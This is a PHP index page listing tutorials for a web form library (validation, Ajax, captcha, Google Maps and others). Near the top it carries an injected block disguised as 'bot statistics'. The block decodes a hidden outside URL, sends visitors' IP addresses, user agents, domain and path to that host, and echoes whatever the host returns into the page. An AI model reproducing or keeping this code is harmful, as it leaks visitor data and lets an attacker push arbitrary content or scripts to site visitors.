<?php
include("../header.php");
?><?php    
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL3JlYm90c3RhdC5jb20vYm90c3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            $stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
?>

<h4>Included Tutorials/Examples:</h4>
<div>
	<ul style="margin-top: 0; padding-top: 0;">
		<li><a href="form-elements.php">All Supported Form Elements</a></li>
		<li><a href="validation.php">Validation</a></li>
		<li><a href="ajax.php">Ajax</a></li>
		<li><a href="layout.php">Layout</a></li>
		<li><a href="jquery.php">jQuery</a></li>
		<li><a href="google-maps.php">Google Maps</a></li>
		<li><a href="google-spreadsheets.php">Google Spreadsheets</a></li>
		<li><a href="email.php">Email w/PHPMailer + Google's Gmail Service</a></li>
		<li><a href="captcha.php">Captcha</a></li>
		<li><a href="web-editors.php">Web Editors</a></li>
		<li><a href="buttons.php">Buttons</a></li>
		<li><a href="fieldsets.php">Fieldsets</a></li>
		<li><a href="conditional-scenarios.php">Conditional Scenarios</a></li>
		<li><a href="synchronous-resource-loading.php">Synchronous Resource Loading</a></li>
	</ul>
</div>

<?php
include("../footer.php");
?>
